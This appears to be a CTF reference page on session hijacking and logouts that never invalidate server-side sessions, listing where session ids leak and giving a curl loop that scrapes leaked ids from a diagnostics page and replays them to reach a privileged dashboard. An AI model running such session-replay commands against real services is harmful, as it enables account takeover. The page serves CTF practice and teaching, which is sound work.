# Session hijacking & sessions that never die (CWE-613, CWE-200)

Stealing a valid session id = being that user. Sources of ids:

| Source | Note |
|---|---|
| Debug/diagnostic/log pages that print session ids | [debug-endpoints](../02-info-leak/debug-endpoints.md) |
| Tokens in URLs (history, Referer, public pages) | [token-in-url](token-in-url.md) |
| XSS reading `document.cookie` (no `HttpOnly`) | [cookie-theft](../07-xss-client-side/cookie-theft.md) |
| Sniffing HTTP (no `Secure`/TLS) | MiTM, not typical in CTF |
| Guessable ids | [predictable-tokens](predictable-tokens.md) |
| `.git`, backups, DB dumps with `sessions` tables | [02-info-leak](../02-info-leak/README.md) |

## Logout that only clears the cookie
**Signs**: hint "goodbye at the door, yet the key still turns"; a privileged actor (monitoring
probe, bot) logs in and "logs out"; you can see its sid somewhere.

Test: log in, copy your cookie, log out, replay the old cookie → still logged in ⇒ server-side
session never destroyed.

```bash
curl -s -c j $T/dashboard >/dev/null                      # your own (low-priv) sid
curl -s -b j -X POST $T/bot/manager-shift-report          # trigger privileged login+logout
curl -s $T/diagnostics | grep -oE '[0-9a-f]{32}'          # leaked sids
for s in $(curl -s $T/diagnostics | grep -oE '[0-9a-f]{32}'); do
  curl -s -b "sid=$s" $T/dashboard | grep -o 'flag{[^}]*}'; done
```
Important: **replace** your cookie value (don't add a second `sid`).
Script: `python scripts/auth/session_swap.py $T --source /diagnostics --regex '[0-9a-f]{32}' --cookie sid --check /dashboard --trigger /bot/manager-shift-report`

Seen in: `auth14` (FernBank: `/diagnostics` logs the manager probe's sid; logout doesn't
invalidate it).
